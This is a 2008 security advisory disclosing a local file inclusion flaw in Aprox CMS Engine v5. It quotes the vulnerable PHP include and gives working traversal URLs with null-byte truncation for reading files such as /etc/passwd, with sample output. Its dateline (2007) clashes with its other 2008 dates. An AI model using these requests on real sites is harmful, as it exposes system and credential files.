@@ -1,0 +1,117 @@
+____________________________________________________________________________
+____________________________________________________________________________
+
+01010111 01001001 01010010 01000101 01000100  01010011 ->
+01000101 01000011 01010101 01010010 01001001  01010100 ->
+01011001                                                      
+
+____________________________________________________________________________
+ADVISORY: APROX CMS ENGINE V5(.1.0.4) LOCAL FILE INCLUSION (LFI)
+____________________________________________________________________________
+
+_____________________
+|| 0x00: ABOUT ME
+|| 0x01: DATELINE
+|| 0x02: INFORMATION
+|| 0x03: EXPLOITATION
+|| 0x04: RISK LEVEL
+
+____________________________________________________________
+____________________________________________________________
+
+_________________
+|| 0x00: ABOUT ME
+
+Author: SkyOut
+Date: June 2008
+Website: http://wired-security.net/
+
+_________________
+|| 0x01: DATELINE
+
+2007-06-21: Bug found
+2007-06-21: Advisory released
+
+____________________
+|| 0x02: INFORMATION
+
+
+The Aprox CMS Engine in version 5 (tested in 1.0.4) is vulnerable to an attack
+in the way of a Local File Inclusion (LFI).
+
+The exploitation has been tested on a local webserver, using Apache HTTPD 2.2.8
++ MySQL 5.0.51a (XAMPP for Windows) on Windows Vista Premium.
+-> http://www.apachefriends.org/en/xampp-windows.html
+
+_____________________
+|| 0x03: EXPLOITATION
+
+Let's look at the index.php files source code:
+
+--- SNIP ---
+if (!isset($_GET["id"]))
+{
+if ((isset($_GET["page"])) && ($_GET["page"] != "")){
+if (file_exists("./engine/inc/".$_GET["page"].".inc")){
+--- SNIP ---
+
+As you can see the script checks for the parameter "id" to be set. Interesting enough,
+but later we won't care for this anymore... What is interesting then is line 3: The
+script makes sure "page" parameter has been set and is unequal NULL. Then the script
+checks if the files does exist, using the extension *.inc!
+
+Now the interesting thing comes in:
+
+--- SNIP ---
+include("./engine/inc/".$_GET["page"].".inc");
+--- SNIP ---
+
+WHUPS! Here the script simply includes the file, that is given through the paramter "page"
+via GET without any further security checks.
+
+Now we can set the "page" parameter to whatever we want :)
+
+Let's try (I did with the file "C:\xampp\xampp-changes.txt" because I don't have a "boot.ini",
+you remember? -> Vista!):
+
+=> http://.../index.php?page=../../../../../../../xampp/xampp-changes.txt
+
+We get the following error: "Fehler - Datei nicht gefunden!", which means in english:
+"Error - File not found!". No wonder, because we build up the following:
+
+=> include("./engine/inc/../../../../../../../xampp/xampp-changes.txt.inc");
+
+And this file really does not exist! So lets cut it off with some simple trick you should know
+from other exploits (if you ever read some!): %00!
+
++-------------------------------------------------------------------------------+
+|===============================================================================| 
+|=> http://.../index.php?page=../../../../../../../xampp/xampp-changes.txt%00 <=|
+|===============================================================================|
+|                                                                               |
+|And now we get the output of "C:\xampp\xampp-changes.txt":                     |
+|                                                                               |
+|--- OUTPUT ---                                                                 |
+|14. Feb 2008 XAMPP 1.6.6a - Upgrade to MySQL 5.0.51a - PHP 4.4.8 (Release) ... |
+|--- OUTPUT ---                                                                 |
+|                                                                               |
+|Now it depends on the system, what you can include:                            |
+|                                                                               |
+|../etc/passwd%00                                                               |
+|../boot.ini%00                                                                 |
+|or others...                                                                   |
++-------------------------------------------------------------------------------+
+
+___________________
+|| 0x04: RISK LEVEL
+
+- MEDIUM - (2/3) -
+
+<!> Happy Hacking <!>
+
+____________________________________________________________________________
+____________________________________________________________________________
+
+EOF
+
+# milw0rm.com [2008-06-21]
